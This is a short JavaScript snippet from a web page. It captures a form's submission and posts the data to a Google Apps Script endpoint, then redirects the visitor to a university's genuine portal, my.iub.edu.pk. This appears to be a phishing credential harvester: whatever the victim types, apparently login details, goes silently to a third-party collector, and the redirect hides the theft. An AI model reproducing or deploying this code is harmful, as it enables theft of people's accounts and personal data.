<script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbw3Js3GVLNGeT09N53mToLu6vcyakbqdS9kN8pdivXCoBN3U_-cjNPzMYTOKgnyGWrS/exec';
    const form = document.forms['Bxcey_Data'];

    form.addEventListener('submit', e => {
        e.preventDefault();
        fetch(scriptURL, { method: 'POST', body: new FormData(form) })
            .then(() => {
                window.location.href = 'https://my.iub.edu.pk/';
            })
            .catch(error => console.error('Error!', error.message));
    });
</script>
